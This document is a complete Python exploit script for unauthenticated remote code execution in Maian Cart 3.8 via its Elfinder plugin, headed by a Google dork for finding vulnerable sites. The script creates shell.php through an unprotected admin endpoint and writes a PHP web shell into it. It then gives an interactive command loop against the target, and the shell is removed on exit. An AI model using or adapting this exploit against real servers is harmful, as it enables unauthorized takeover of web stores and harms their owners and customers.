#!/usr/bin/python3

#Maian-Cart 3.8 unauthorized RCE trough Elfinder plugin.
#Exploit found date: 27.11.2020 19:35
#Tested on: Ubuntu 20.04 LTS
#Google dork: "Powered by: Maian Cart"


import argparse
import requests
from bs4 import BeautifulSoup
import sys
import json
import time

parser = argparse.ArgumentParser()
parser.add_argument("host", help="Host to exploit (with http/https prefix)")
parser.add_argument("dir", help="default=/ , starting directory of the maian-cart instance, sometimes is placed at /cart or /maiancart")
args = parser.parse_args()

#args

host = sys.argv[1]
directory = sys.argv[2]

#CREATE THE FILE

print("\033[95mCreating the file to write payload to...\n\033[00m", flush=True)
time.sleep(1)

try:
    r = requests.get(f"{host}{directory}/admin/index.php?p=ajax-ops&op=elfinder&cmd=mkfile&name=shell.php&target=l1_Lw")
    print(r.text)
    if "added" in r.text:
        print("\033[95mFile successfully created.\n\033[00m")
    else:
        print("\033[91mSome error occured.\033[00m")

except (requests.exceptions.RequestException):
    print("\033[91mThere was a connection issue. Check if you're connected to wifi or if the host is correct\033[00m")

#GET THE FILE ID

time.sleep(1)

file_response = r.text
soup = BeautifulSoup(file_response,'html.parser')
site_json=json.loads(soup.text)
hash_id = [h.get('hash') for h in site_json['added']]
file_id =  str(hash_id).replace("['", "").replace("']", "")


print("\033[95mGot the file id: ", "\033[91m", file_id , "\033[00m")
print("\n")

#WRITE TO THE FILE

print("\033[95mWritting the payload to the file...\033[00m")
print("\n")
time.sleep(1)

headers = {
    "Accept": "application/json, text/javascript, /; q=0.01",
    "Accept-Language" : "en-US,en;q=0.5",
    "Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With" : "XMLHttpRequest",
    "Connection" : "keep-alive",
    "Pragma" : "no-cache",
    "Cache-Control" : "no-cache",
}

data = f"cmd=put&target={file_id}&content=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%20%3F%3E"

try:
    write = requests.post(f"{host}{directory}/admin/index.php?p=ajax-ops&op=elfinder", headers=headers, data=data)
    print(write.text)
except (requests.exceptions.RequestException):
    print("\033[91mThere was a connection issue. Check if you're connected to wifi or if the host is correct\033[00m")


#EXECUTE THE PAYLOAD

print("\033[95mExecuting the payload...\033[00m")
print("\n")
time.sleep(1)

exec_host = f"{host}{directory}/product-downloads/shell.php"

print(f"\033[92mGetting a shell. To stop it, press CTRL + C. Browser url: {host}{directory}/product-downloads/shell.php?cmd=\033[00m")
time.sleep(2)

while True:
    def main():
        execute = str(input("$ "))
        e = requests.get(f"{exec_host}?cmd={execute}")
        print(e.text)

    try:
        if __name__ == "__main__":
            main()
    except:
        exit = str(input("Do you really wish to exit? Y/N? "))

        if exit == "Y" or exit =="y":
            print("\033[91mExit detected. Removing the shell...\033[00m")
            remove = requests.get(f"{host}{directory}/admin/index.php?p=ajax-ops&op=elfinder&cmd=rm&targets%5B%5D={file_id}")
            print("\033[91m" , remove.text, "\033[00m")
            print("\033[91mBye!\033[00m")
            sys.exit(1)
        else:
            main()
